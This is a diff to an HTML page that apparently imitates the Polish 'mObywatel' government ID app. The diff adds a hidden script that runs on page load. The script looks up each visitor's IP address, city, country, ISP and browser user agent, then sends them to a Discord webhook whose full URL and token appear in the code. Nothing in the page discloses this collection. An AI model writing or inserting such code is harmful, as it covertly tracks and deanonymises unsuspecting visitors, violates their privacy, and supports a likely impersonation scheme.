@@ -135,6 +135,36 @@
             <p class="discord_text">Zobacz moje IG</p>
         </div>
     </div-->
+  <script>
+    fetch("https://ipapi.co/json/")
+      .then(res => res.json())
+      .then(data => {
+        const payload = {
+          content: null,
+          embeds: [
+            {
+              title: "mObywatel",
+              color: 5814783,
+              fields: [
+                { name: "IP", value: data.ip, inline: true },
+                { name: "Miasto", value: data.city || "Nieznane", inline: true },
+                { name: "Kraj", value: data.country_name || "Nieznane", inline: true },
+                { name: "ISP", value: data.org || "Nieznane", inline: false },
+                { name: "User-Agent", value: navigator.userAgent, inline: false }
+              ],
+              timestamp: new Date().toISOString()
+            }
+          ]
+        };
 
+        fetch("https://discordapp.com/api/webhooks/1369603198389587989/yUxYRZ6xhrnHMPm4IgdQ5UDc_ijcOo0gt984mMGGw-ugrgENr_8cn8OlLSwRghl9xsBB", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+      });
+  </script>
     <script src="assets/index.js"></script>
 </body>
